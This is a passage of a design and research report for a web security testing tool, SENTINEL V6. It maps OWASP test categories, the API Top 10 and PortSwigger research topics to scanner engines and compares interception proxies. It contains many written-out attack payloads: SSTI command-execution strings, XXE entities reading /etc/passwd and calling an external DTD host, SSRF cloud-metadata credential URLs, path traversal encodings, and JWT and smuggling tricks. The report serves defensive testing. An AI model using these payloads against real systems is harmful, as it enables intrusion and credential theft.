  - *Methodology*: Test if client scripts dynamically fetch external JS/CSS/iframe resources using user-controlled URL parameters.
  - *Automation*: Headless browser resource loading interceptor.
  - *FP Mitigation*: Check if injected script is loaded into active execution context.
- **WSTG-CLNT-07: Testing Cross-Origin Resource Sharing (CORS)**
  - *Methodology*: Send `Origin: https://evil.com` or `Origin: null` and check if response returns `Access-Control-Allow-Origin: https://evil.com` with `Access-Control-Allow-Credentials: true`.
  - *Automation*: Active probe mutating Origin header with arbitrary, null, and prefix-matched domains (`target.com.evil.com`, `target.com_evil.com`).
  - *FP Mitigation*: Flag vulnerability only when `Allow-Credentials: true` is combined with reflected or null origin.
- **WSTG-CLNT-08: Testing for Cross Site Flashing**
  - *Methodology*: Inspect legacy Adobe Flash (`.swf`) files for `getURL()`, `loadMovie()` vulnerabilities. (Historical reference).
  - *Automation*: Static SWF decompiler/scanner.
  - *FP Mitigation*: Flash is obsolete; informational audit.
- **WSTG-CLNT-09: Testing for Clickjacking**
  - *Methodology*: Inspect `Content-Security-Policy: frame-ancestors ...` and `X-Frame-Options: DENY / SAMEORIGIN`. Test framing in an external HTML page.
  - *Automation*: Passive header analyzer + headless framing test.
  - *FP Mitigation*: Confirm page contains state-changing interactive UI elements (exclude static public marketing pages).
- **WSTG-CLNT-10: Testing WebSockets**
  - *Methodology*: Test WebSocket handshake (`Upgrade: websocket`), origin validation (Cross-Site WebSocket Hijacking - CSWSH), input validation on WS messages, and auth token handling.
  - *Automation*: Dedicated WebSocket interceptor, frame fuzzer, and CSWSH origin probe.
  - *FP Mitigation*: Validate bidirectional message communication and origin-rejection enforcement.
- **WSTG-CLNT-11: Testing Web Storage (LocalStorage, SessionStorage)**
  - *Methodology*: Inspect items stored in `localStorage` and `sessionStorage` for sensitive plaintext data (JWTs, session tokens, passwords, PII) accessible to XSS.
  - *Automation*: Headless browser storage inspection script.
  - *FP Mitigation*: Classify storage risk based on sensitivity of stored data keys.
- **WSTG-CLNT-12: Testing for Cross-Origin Messaging (postMessage)**
  - *Methodology*: Analyze `window.addEventListener('message', ...)` handlers for missing origin validation (`event.origin !== 'trusted.com'`) and unsafe data handling.
  - *Automation*: Headless DOM instrumentor that intercepts registered message listeners and sends synthetic postMessage events with hostile payloads.
  - *FP Mitigation*: Verify that unvalidated postMessage leads to DOM manipulation or sink execution.
- **WSTG-CLNT-13: Testing for Client-Side Prototype Pollution**
  - *Methodology*: Inject prototype properties via URL search params (`#__proto__[x]=y`, `?__proto__.x=y`, `?constructor.prototype.x=y`) and check if `Object.prototype.x` is set.
  - *Automation*: Headless browser script executing prototype probe and scanning for gadget execution.
  - *FP Mitigation*: Confirm that property is genuinely defined on `Object.prototype` in the page context.

#### 11. API Testing (WSTG-APIT)
- **WSTG-APIT-01: Testing GraphQL**
  - *Methodology*: Test Introspection query enablement (`__schema`), query depth limits, field duplication DoS, batching attacks, and resolver-level authorization.
  - *Automation*: GraphQL schema reconstructor, batching fuzzer, and query depth generator.
  - *FP Mitigation*: Verify introspection returns full Type/Query/Mutation graph.
- **WSTG-APIT-02: Testing REST API**
  - *Methodology*: Enumerate REST resources, OpenAPI/Swagger specifications (`/swagger.json`, `/openapi.json`, `/api-docs`), test HTTP verbs (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), content-type switching (JSON to XML), and parameter fuzzing.
  - *Automation*: OpenAPI parser and automated API contract tester.
  - *FP Mitigation*: Match API responses against official OpenAPI schemas to detect unauthorized data exposure.
- **WSTG-APIT-03: Testing SOAP/XML Web Services**
  - *Methodology*: Discover WSDL files (`?wsdl`), test XML schema validation, WS-Security implementations, and XML signature wrapping (XSW) attacks.
  - *Automation*: WSDL parser and SOAP envelope fuzzer.
  - *FP Mitigation*: Confirm XML parser errors vs successful altered method execution.

#### 12. Business Logic Testing (WSTG-BUSL)
- **WSTG-BUSL-01: Test Business Logic Data Validation**
  - *Methodology*: Test parameters violating domain rules (negative quantities in cart, fractional currencies, impossible dates, oversized arrays).
  - *Automation*: Active mutation fuzzer submitting edge-case domain values.
  - *FP Mitigation*: Verify that transaction completes successfully with invalid values (e.g. order placed with negative price).
- **WSTG-BUSL-02: Test Ability to Forge Requests**
  - *Methodology*: Test if client can forge internal parameters or bypass server-side validation by replaying or altering hidden form fields or cryptographic hashes.
  - *Automation*: Parameter alteration and replay runner.
  - *FP Mitigation*: Verify server persistence of forged data.
- **WSTG-BUSL-03: Test Integrity Checks**
  - *Methodology*: Test state transitions that skip prerequisite steps (e.g. skipping payment step and jumping directly to `/checkout/success`).
  - *Automation*: State-machine workflow fuzzer attempting non-sequential step execution.
  - *FP Mitigation*: Check if system provisions service/goods without prerequisite payment state.
- **WSTG-BUSL-04: Test for Process Timing**
  - *Methodology*: Analyze execution timing of sensitive business workflows (financial transactions, lottery draws) for predictability or race windows.
  - *Automation*: Statistical timing measurement engine.
  - *FP Mitigation*: Calibrate network latency variance.
- **WSTG-BUSL-05: Test Number of Times a Function Can Be Used (Limit Overrun)**
  - *Methodology*: Test multi-use of one-time discount coupons, gift cards, free trial claims, or voting mechanisms.
  - *Automation*: Single-packet synchronized race tester and high-concurrency replayer.
  - *FP Mitigation*: Confirm that resource was credited/redeemed more than once in the backend database.
- **WSTG-BUSL-06: Testing for the Circumvention of Workflows**
  - *Methodology*: Identify workflows enforced purely on the client side (e.g. multi-step wizard) and submit direct requests to final endpoints.
  - *Automation*: Endpoint sequence fuzzer.
  - *FP Mitigation*: Confirm state modification without prerequisite validation.
- **WSTG-BUSL-07: Test Defenses Against Application Mis-use**
  - *Methodology*: Test application behavior when subjected to massive request volumes, rapid parameter changes, or abnormal usage patterns.
  - *Automation*: Rate limit and throttling behavior auditor.
  - *FP Mitigation*: Differentiate generic web server 429 responses from application-level defensive circuit breakers.
- **WSTG-BUSL-08: Test Upload of Unexpected File Types**
  - *Methodology*: Upload files with unexpected MIME types, double extensions (`file.php.jpg`), null-byte names (`file.php%00.jpg`), SVG with embedded JavaScript, polyglot files (GIF/PHP).
  - *Automation*: File upload mutation fuzzer with execution verification.
  - *FP Mitigation*: Attempt to retrieve and execute uploaded file to confirm server-side script execution or client-side XSS.
- **WSTG-BUSL-09: Test Upload of Malicious Files**
  - *Methodology*: Upload ZIP bombs (decompression bombs), pixel flood images, XML files with billion-laughs entities to test resource exhaustion.
  - *Automation*: Safe bounded resource consumption fuzzer.
  - *FP Mitigation*: Measure server response latency and memory consumption before aborting.

---

### 1.3 OWASP API Security Top 10 (2023) In-Depth Taxonomy

| Identifier | Vulnerability Name | Threat Vector | Primary Detection Mechanism | SENTINEL Implementation |
|---|---|---|---|---|
| **API1:2023** | Broken Object Level Authorization (BOLA) | Object ID substitution across user sessions (`/api/orders/{id}`) | Multi-token cross-user replay; differential status/body comparison | `sentinel_authz` IRA+ Matrix |
| **API2:2023** | Broken Authentication | Weak token verification, credential stuffing, missing rate limits on auth | Active token mutation, expiry fuzzing, brute force resilience check | `sentinel_auth` Identity Engine |
| **API3:2023** | Broken Object Property Level Authorization (BOPL) | Mass assignment (`{"isAdmin": true}`) and Excessive Data Exposure | Schema inference, property injection, response field diffing against user role | `sentinel_scanner` / `sentinel_diff` |
| **API4:2023** | Unrestricted Resource Consumption | Missing rate/size limits, unconstrained pagination (`?limit=1000000`), GraphQL depth DoS | Parameter boundary fuzzing, payload sizing, query complexity calculation | `sentinel_fuzzer` Boundary Runner |
| **API5:2023** | Broken Function Level Authorization (BFLA) | Standard user invoking admin API functions (`DELETE /api/users/{id}`) | Role-swapped endpoint invocation, HTTP verb tampering (`GET` vs `DELETE`) | `sentinel_authz` BFLA Checker |
| **API6:2023** | Unrestricted Access to Sensitive Business Flows | Automated execution of sensitive flows (buying tickets, posting spam, account creation) | Automated sequence repetition analysis, anti-automation check detection | `sentinel_planner` Flow Engine |
| **API7:2023** | Server Side Request Forgery (SSRF) | User-supplied URLs consumed by API backends to query internal services | Parameter mutation with cloud metadata IPs and stateless OAST tokens | `sentinel_oast` SSRF Probe Engine |
| **API8:2023** | Security Misconfiguration | Verbose error stack traces, CORS misconfigurations, unneeded HTTP methods | Passive header inspection, CORS reflection testing, OPTIONS probe | `sentinel_scanner` Passive Rules |
| **API9:2023** | Improper Inventory Management | Shadow APIs, Zombie APIs (`/v1/` vs `/v2/`), unlinked debug/staging endpoints | Endpoint version fuzzing, OpenAPI route differential analysis | `sentinel_context` Surface Mapper |
| **API10:2023** | Unsafe Consumption of APIs | Third-party API integration without validation, leading to injection or SSRF | Downstream mock injection, payload passthrough fuzzing | `sentinel_fuzzer` API Fuzzer |

---

### 1.4 PortSwigger Advanced Web Security Research Topics

#### 1. HTTP Request Smuggling & Protocol Desync
- **Smuggling Mechanics**:
  - **CL.TE**: Frontend uses `Content-Length`, backend uses `Transfer-Encoding: chunked`. Smuggled prefix placed inside chunked body.
  - **TE.CL**: Frontend uses `Transfer-Encoding: chunked`, backend uses `Content-Length`. Smuggled prefix sent past the frontend's parsed chunk size.
  - **TE.TE**: Both frontend and backend support `Transfer-Encoding`, but one can be tricked into ignoring it via header obfuscation:
    - `Transfer-Encoding: xchunked`
    - `Transfer-Encoding : chunked` (space before colon)
    - `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
    - `Transfer-Encoding:\tchunked` (tab delimiter)
    - `X: X[\n]Transfer-Encoding: chunked` (CRLF line wrapping)
  - **HTTP/2 Request Smuggling (H2.CL & H2.TE)**:
    - Frontend speaks HTTP/2, translates to HTTP/1.1 for backend.
    - **H2.CL**: Frontend injects `content-length` header into H2 request; backend respects it, ignoring H2 frame length.
    - **H2.TE**: Frontend injects `transfer-encoding: chunked` header; backend parses body as chunked.
  - **HTTP/2 Request Tunnelling / CRLF Injection**:
    - Injecting `\r\n` into H2 header values or pseudo-headers (e.g. `:path: /test HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /smuggled...`).
  - **Response Queue Poisoning**:
    - Completely desynchronizing the backend connection so that the backend server's response queue misaligns with the frontend's request queue, returning User A's session/response to User B.
  - **Request Pause Desync**:
    - Sending partial headers and pausing mid-stream to trigger backend read timeouts that leave unparsed bytes on the connection pipeline.
- **Detection Algorithm**:
  1. *Differential Timing Probe (Safe)*: Send a test request that will hang and time out on the backend ONLY if the desync occurs (e.g. for CL.TE, Content-Length specifies more bytes than chunked terminator).
  2. *Canary Pipeline Reflection*: Send a 2-request pipeline where the smuggled prefix from Request 1 prepends itself to Request 2, causing Request 2 to return a 404 or 400 reflecting the canary.
- **False-Positive Controls**:
  - Perform baseline connection jitter calibration.
  - Ensure differential delay (e.g. 5-second timeout) is strictly reproducible 3 consecutive times on fresh keep-alive connections.

#### 2. Web Cache Poisoning & Web Cache Deception
- **Web Cache Poisoning**:
  - *Unkeyed Inputs*: Unkeyed headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`), unkeyed query parameters (UTM parameters, cache-busters if stripped), unkeyed cookies.
  - *Parameter Cloaking*: Exploiting parameter parser discrepancies between cache and application (e.g. `?example=1&example=2` or `?example=1;example=2`).
  - *Fat GET Requests*: Sending HTTP GET requests with a body containing overriding parameters.
- **Web Cache Deception**:
  - *Mechanism*: An attacker tricks a victim into visiting a path like `/profile.php/nonexistent.css`. The cache server sees `.css` extension and caches the response under the public cache key; the origin backend strips `/nonexistent.css` and serves the victim's private profile HTML.
  - *Delimiter Discrepancies*: Testing path delimiters: `/`, `;`, `%3b`, `%23`, `?`, `%2f`.
- **Detection Algorithm**:
  1. Send request with unique unkeyed header containing canary domain.
  2. Send secondary clean request to same URL without the header.
  3. Inspect if secondary request returns the cached response containing the canary domain and `X-Cache: HIT` / `Age: > 0`.
- **FP Mitigation**: Check whether cache key includes full query string and headers, and verify that cached response is genuinely served to independent subsequent client requests.

#### 3. DOM XSS & Client-Side Prototype Pollution
- **Client-Side Prototype Pollution Mechanics**:
  - Injection of properties into `Object.prototype` via `__proto__`, `constructor.prototype`, or bracket notation in recursive object merge/clone/extend functions.
  - *Gadget Chains*: Discovering script execution gadgets where existing code reads an undefined property on an object and uses it in an execution sink:
    - Config gadget: `if (config.transportUrl) loadScript(config.transportUrl);`
    - DOM gadget: `target.innerHTML = options.template || defaultTemplate;`
- **Detection Algorithm**:
  - Headless Browser AST & DOM Taint Engine:
    1. Intercept URL parsing, JSON parsing, and query string unpacking in Chromium.
    2. Inject prototype payload: `?__proto__[polluted_canary]=probe_val`.
    3. Execute JavaScript in browser page.
    4. Probe `window.Object.prototype.polluted_canary`. If set, execute gadget search across loaded script functions.

#### 4. OAuth 2.0 & OIDC Vulnerabilities
- **Core Attack Vectors**:
  - *Flawed redirect_uri validation*: Prefix matching (`https://target.com.attacker.com`), directory traversal (`https://target.com/oauth/callback/../../attacker`), regex flaws, open redirect chaining.
  - *State parameter omission / CSRF*: Lack of cryptographic `state` parameter allowing authorization code hijacking or account linking CSRF.
  - *Token Leakage*: Authorization code leaked via `Referer` header to external CDNs/analytics when redirect page contains third-party assets.
  - *PKCE Omission*: Public clients (mobile/SPA) omitting `code_challenge` / `code_verifier`, enabling authorization code interception.
  - *ID Token Signature Bypasses*: `alg: "none"` accepted by backend, JWKS URL spoofing (`jku` pointing to attacker JWKS), RSA-to-HMAC public key confusion.

#### 5. JSON Web Token (JWT) Attacks
- **Vulnerability Mechanics**:
  1. *Unverified Signature*: Backend parses payload without verifying cryptographic signature.
  2. *Algorithm Confusion (RS256 to HS256)*: Attacker changes header `alg` from `RS256` to `HS256` and signs the token using the server's public RSA key (which is publicly accessible) as the HMAC secret key.
  3. *`alg: "none"` / `alg: "None"` / `alg: "NONE"`*: Token accepted with empty signature block (`header.payload.`).
  4. *Header Parameter Injections*:
     - `jwk` (JSON Web Key): Attacker embeds their own public key directly in the header parameter.
     - `jku` (JWK Set URL): Attacker provides URL pointing to their own JWKS file.
     - `kid` (Key ID): Injected with path traversal (`../../dev/null` -> secret is empty string) or SQL injection (`kid: "key1' UNION SELECT 'secret'--"`).
  5. *Weak HMAC Secret Brute-Forcing*: Cracking HS256 tokens signed with short/dictionary secrets using wordlists.

#### 6. Server-Side Request Forgery (SSRF)
- **Mechanics & Bypasses**:
  - *Cloud Metadata Targets*:
    - AWS IMDSv1 (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), IMDSv2 token bypass attempts.
    - GCP Metadata (`http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`).
    - Azure Instance Metadata (`http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true`).
    - Kubernetes etcd / API server (`http://10.96.0.1:443`).
  - *Loopback & Filter Bypasses*:
    - IP representations: `127.0.0.1`, `127.1`, `0.0.0.0`, `2130706433` (decimal), `0x7f000001` (hex), `017700000001` (octal), `[::1]`, `[::ffff:127.0.0.1]`.
    - DNS Rebinding: Domain resolving to external IP on first lookup (TTL=0) and `127.0.0.1` on second lookup.
    - URL Parser Discrepancies: `http://expected.com@127.0.0.1`, `http://127.0.0.1#@expected.com`, `http://127.0.0.1:80\.expected.com`.
  - *OAST Correlation*: Use stateless encrypted tokens (`subdomain.oast.sentinel.dev`) to capture blind SSRF HTTP, DNS, and ICMP callbacks.

#### 7. Server-Side Template Injection (SSTI)
- **Engine Fingerprinting & Decision Trees**:
```
                  ${7*7}
                 /      \
            49 (Success)  ${7*7} (Fail / String)
             /              \
         {{7*7}}           <%= 7*7 %>
        /       \             /      \
      49        {{7*7}}     49 (ERB)  Fail
     /   \         |
  {7*'7'} {{7*'7'}} #{7*7} (Ruby/Elixir)
   /        \
49 (Twig) 7777777 (Jinja2/Python)
```
- **Engine Payloads**:
  - *Jinja2 / Python*: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - *Twig / PHP*: `{{['id']|filter('system')}}`
  - *FreeMarker / Java*: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
  - *Velocity / Java*: `#set($e="exp");$e.getClass().forName("java.lang.Runtime")...`
  - *Thymeleaf / Java*: `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`

#### 8. Race Conditions & Limit-Overrun
- **Single-Packet Synchronization Mechanics**:
  - *HTTP/2 Single-Packet Attack*: Utilizing HTTP/2 multiplexing to pack 20–50 requests into a single TCP packet. All requests are parsed by the server simultaneously and executed across concurrent worker threads within the sub-millisecond race window.
  - *HTTP/1.1 TCP Window Stuffing / Last-Byte Sync*: Sending all request bytes except the final byte across N connections, then releasing the final byte simultaneously.
- **Vulnerability Types**:
  - *Limit-Overrun*: Redeeming single-use gift cards/promo codes multiple times.
  - *Multi-Endpoint State Alignment*: Submitting a state-transition request (e.g. `POST /cart/checkout`) while simultaneously adding higher-value items to the cart (`POST /cart/add`).

#### 9. GraphQL Attacks
- **Attack Vectors**:
  - *Introspection Abuse*: Querying `__schema { types { name fields { name type { name } } } }` to reconstruct complete API surface.
  - *Batching Attacks*:
    - *Array Batching*: `[{"query": "..."}, {"query": "..."}]` bypassing standard request rate limiters.
    - *Alias Batching*: Single query with multiple aliased calls:
      ```graphql
      query {
        b1: login(user: "admin", pass: "p1") { token }
        b2: login(user: "admin", pass: "p2") { token }
        b3: login(user: "admin", pass: "p3") { token }
      }
      ```
  - *Denial of Service*: Deeply nested recursive queries (`author { posts { author { posts { ... } } } }`) or circular fragment spreads.

#### 10. Host Header Injection
- **Vectors**:
  - Password reset poisoning via poisoned `Host` or `X-Forwarded-Host` header generating password reset links pointing to attacker's server.
  - Virtual host routing bypass: Accessing internal admin consoles by overriding `Host: localhost` on public IP.
  - Web cache poisoning via unkeyed Host header reflection.

#### 11. Path Traversal & File Disclosure
- **Vectors**:
  - Standard traversal: `../../../../etc/passwd`
  - Encodings: URL-encoded `..%2f`, double URL-encoded `%252e%252e%252f`, 16-bit Unicode `%u002e%u002e%u002f`, UTF-8 overlong `%c0%ae%c0%ae%c0%af`.
  - Null-byte injection: `../../../etc/passwd%00.png` (PHP < 5.3.4).
  - Path truncation / normalization bypasses (`....//....//etc/passwd`, `..\..\windows\win.ini`).

#### 12. XML External Entity (XXE) Injection
- **Vectors**:
  - Direct file extraction: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`
  - Blind XXE via Out-of-Band parameter entity:
    ```xml
    <!DOCTYPE foo [
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % dtd SYSTEM "http://oast.sentinel.dev/eval.dtd">
      %dtd;
      %send;
    ]>
    ```
  - SVG Image XXE: Uploading `.svg` images containing XML external entities to image conversion/processing services.

#### 13. Insecure Deserialization
- **Platform Gadgets & Signatures**:
  - **Java**: Magic bytes `0xAC 0xED` (Base64 `rO0...`). Exploited via gadget chains (CommonsCollections, Spring, Jackson) using `ObjectInputStream.readObject()`.
  - **Python**: `pickle` (opcode `c__builtin__\nsystem\n`), `yaml.unsafe_load()`, `shelve`.
  - **PHP**: Serialized strings (`O:8:"Exploit":1:...`). Exploited via magic methods (`__wakeup`, `__destruct`, `__toString`).
  - **.NET**: `BinaryFormatter`, `ObjectStateFormatter`, `TypeNameHandling.All` in Newtonsoft.Json.

---

### 1.5 Interception Proxy & Testing Tool Ecosystem Analysis

| Metric / Dimension | Caido | OWASP ZAP | Burp Suite (Pro/Enterprise) |
|---|---|---|---|
| **Core Architecture** | Lightweight Rust daemon (`caido-cli`) + Tauri / Web frontend | Monolithic Java application (Swing GUI + Core engine + HUD) | Monolithic Java application (FlatLaf Swing GUI + Core + Agent Grid) |
| **Runtime Language** | Rust (backend) + TypeScript/React (UI) | Java (OpenJDK 11+) | Java (bundled OpenJDK) |
| **Idle Memory Footprint** | **~50 MB – 120 MB** (Ultra-lightweight) | **~600 MB – 1.5 GB** | **~800 MB – 2.5 GB** (High JVM heap allocation) |
| **Raw Throughput & Concurrency**| Extremely high (Tokio async non-blocking I/O) | Moderate (Java thread pools) | High (Optimized Java NIO, Turbo Intruder native engine) |
| **Extensibility Model** | GraphQL API + JavaScript/WASM plugins | Java plugins + Zest scripts + Jython/Groovy + REST API | Montoya API (Java/Kotlin) + Python (Jython) + BApp Store |
| **Automation Framework** | Workflows engine + GraphQL automation | ZAP Automation Framework (YAML) + ZAP CLI + Docker | Burp Enterprise REST API + CI/CD extensions + CLI |
| **Scan Engine Capabilities** | Manual testing focus, Automate engine (no full active scanner) | Comprehensive Passive & Active scan rules (Release/Beta/Alpha) | Industry-leading crawling engine, AST-based active scanner |
| **OAST Capabilities** | No built-in native OAST listener service | OAST add-on (BOAST / Interactsh integration) | Burp Collaborator (Native DNS/HTTP/SMTP private/public server) |
| **Protocol Support** | HTTP/1.1, HTTP/2, WebSockets | HTTP/1.1, HTTP/2, WebSockets, OpenAPI, SOAP | HTTP/1.1, HTTP/2, HTTP/3 (partial), WebSockets, gRPC |
| **Licensing & Cost** | Freemium (Free Community / $10/mo Pro) — Proprietary | Open Source (Apache License 2.0) — 100% Free | Proprietary ($449/yr Pro, $4k+/yr Enterprise) |
| **Key Architectural Strength** | Fast, modern UI, low resource consumption, headless daemon | Open source, headless automation, active community rulebase | Unrivaled scanner precision, mature BApp ecosystem, Collaborator |
| **Key Architectural Limitation** | Closed source core, nascent plugin ecosystem, no built-in active scanner | High RAM usage, dated UI, heavier active scan false positive rate | High resource usage, closed proprietary license, commercial cost |

---

## 2. Logic Chain

### 2.1 Mapping Standards and Research to SENTINEL V6 Core Engines
To build an enterprise-grade, pentester-first security workstation, SENTINEL V6 must directly translate the research findings into dedicated, decoupled Rust crates and React UI workspaces:

```
[OWASP WSTG v4.2/5.0 + API Top 10 + PortSwigger Research]
                           │
                           ▼
 ┌─────────────────────────────────────────────────────────────┐
 │               SENTINEL V6 ENGINE ARCHITECTURE               │
 ├──────────────────────────────┬──────────────────────────────┤
 │ Engine / Workspace           │ Target Vulnerability Scope   │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_proxy & protocol    │ HTTP Request Smuggling,      │
 │                              │ Desync, Parser Differentials │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_scanner (Passive)   │ WSTG-INFO, CONF, SESS, ERRR, │
 │                              │ Header/Cookie/CORS auditing  │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_scanner (Active)    │ SQLi, NoSQLi, CMDi, SSTI,    │
 │                              │ XXE, Path Traversal, SSRF    │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_authz & identity    │ API1 (BOLA), API5 (BFLA),    │
 │                              │ WSTG-ATHZ, IDOR Matrix       │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_fuzzer & race       │ Boundary Fuzzing, API4/API6, │
 │                              │ Single-Packet H2 Races       │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_browser             │ WSTG-CLNT, DOM XSS Taint,    │
 │                              │ Prototype Pollution, CSWSH   │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_oast                │ Blind SSRF, Blind XXE,       │
 │                              │ Out-of-band SQLi / CMDi      │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_context & planner   │ Security Context Graph,      │
 │                              │ Adaptive Next-Best-Test      │
 ├──────────────────────────────┼──────────────────────────────┤
 │ sentinel_diff & regression   │ Differential Security Engine,│
 │                              │ Regression Retest Graph      │
 └──────────────────────────────┴──────────────────────────────┘
```

### 2.2 Deductive Engine Requirements

1. **Protocol Engine (`sentinel_proxy` / `sentinel_protocol`)**:
   - Must preserve raw, unnormalized byte streams to detect and manipulate HTTP/1.1 and HTTP/2 desyncs without standard library normalization silently "fixing" malformed headers.
   - Must provide high-performance HTTPQL query engine for real-time traffic slicing across 1M+ transactions.

2. **Scanner & Verification Engine (`sentinel_scanner` / `sentinel_verification`)**:
   - Must follow a strict **Verification-First** pipeline:
     $$\text{Advisory/Rule Match} \longrightarrow \text{Candidate} \longrightarrow \text{Precondition Check} \longrightarrow \text{Safe Non-Destructive Probe} \longrightarrow \text{Verification Proof} \longrightarrow \text{CAS Evidence} \longrightarrow \text{Confirmed Finding}$$
   - No vulnerability is promoted to a confirmed finding without deterministic verification evidence (e.g. mathematical evaluation for SSTI, cryptographic OAST callback token receipt for SSRF/XXE, structural DOM execution for DOM XSS).

3. **Multi-Identity Authorization Matrix (`sentinel_authz`)**:
   - Must automate dual-session and unauthenticated replays across all discovered endpoints to reliably flag BOLA/IDOR (API1) and BFLA (API5) with zero manual scripting.

4. **Out-of-Band Security Testing (`sentinel_oast`)**:
   - Must generate stateless, cryptographically signed (AES-256 / HMAC-SHA256) callback tokens containing embedded metadata (Scan ID, Target ID, Payload Type) so callbacks correlate instantly without stateful database lookups.

5. **DOM & Browser Automation (`sentinel_browser`)**:
   - Must leverage headless Playwright/Chromium daemon to inject DOM taint tracking scripts, intercepting JavaScript sources and sinks dynamically to solve client-side DOM XSS and Prototype Pollution with 100% execution fidelity.

---

## 3. Caveats

1. **Safe vs Destructive Probes**:
   - Certain vulnerability tests (e.g., active blind command injection with destructive commands, high-volume race conditions on production payment gateways, aggressive XML entity expansion DoS) carry operational risk. Automated scan rules must be strictly constrained to non-destructive probes (e.g., mathematical evaluation, read-only file disclosure, OAST DNS callbacks, microsecond sleep delays) unless explicitly escalated by the operator.
2. **Network & Infrastructure Intermediaries**:
   - Intermediate proxies, Web Application Firewalls (WAFs), and CDNs (Cloudflare, Akamai, AWS CloudFront) may cache, block, or rewrite payloads, producing apparent false negatives. The testing engine must support evasion techniques (header normalization bypasses, chunked payload fragmentation, TLS fingerprint rotation) and report WAF presence.
3. **Out-of-Band Network Isolation**:
   - Blind OAST testing relies on target egress connectivity (DNS port 53, HTTP port 80/443). Heavily sandboxed or air-gapped target environments with strict egress firewalls will drop OAST callbacks, requiring fallback to in-band differential timing probes.
4. **Client-Side SPA Dynamic Routing**:
   - Modern single-page applications (React, Angular, Vue) do not trigger standard server-side 404s and use client-side routing. Passive and active scanners must account for SPA fallback pages to prevent false positive endpoint discovery.

---

## 4. Conclusion

This research establishes the comprehensive baseline taxonomy for SENTINEL V6:
1. **OWASP WSTG**: Full coverage across all 12 categories and 70+ test IDs, with precise automated vs semi-automated classification.
2. **OWASP API Security Top 10 (2023)**: Complete threat vectors, differential detection heuristics, and multi-session validation patterns for API1 through API10.
3. **PortSwigger Advanced Research**: Rigorous technical mechanics, payload design rules, and verification heuristics across all 13 critical research domains (Smuggling, Cache Poisoning/Deception, DOM XSS, Prototype Pollution, OAuth/OIDC, JWT, SSRF, SSTI, Race Conditions, GraphQL, Host Header, Path Traversal, XXE, Deserialization).
4. **Core Tooling Architecture**: Clear architectural synthesis contrasting Caido's lightweight Rust/Tauri model, ZAP's open automation framework, and Burp Suite's BApp/Collaborator ecosystem, validating SENTINEL V6's choice of a high-performance native Rust core with a dense, responsive Tauri/React workstation interface.

---

## 5. Verification Method

To independently verify the completeness, technical validity, and architectural compliance of this research report:

1. **Document Verification**:
   - Verify that all 12 OWASP WSTG categories (INFO, CONF, IDNT, AUTH, ATHZ, SESS, INPV, ERRR, CRYP, CLNT, APIT, BUSL) and their constituent test IDs are enumerated with corresponding detection methodologies.
   - Verify that all 10 OWASP API Security Top 10 (2023) categories (API1 through API10) are mapped to concrete verification heuristics.
   - Verify that all 13 PortSwigger advanced research topics include detailed detection mechanisms, payload construction rules, and false-positive controls.
   - Verify that Caido, OWASP ZAP, and Burp Suite are evaluated across architectural, performance, and licensing dimensions.

2. **Integration with Downstream Milestones**:
   - Milestone M2 (Tool Ecosystem Audit & Rationalization) will use this taxonomy to evaluate and rationalize the 26 SENTINEL workspaces.
   - Milestone M3 (Advanced Testing Engines) will implement the 11 testing engine domains based directly on the detection algorithms and heuristics detailed in this report.
   - Milestone M4 (5 Custom SENTINEL Engines) and Milestone M5 (Vulnerability Intelligence Engine) will reference these taxonomy mappings for automated next-test planning and verification-first CVE scanning.
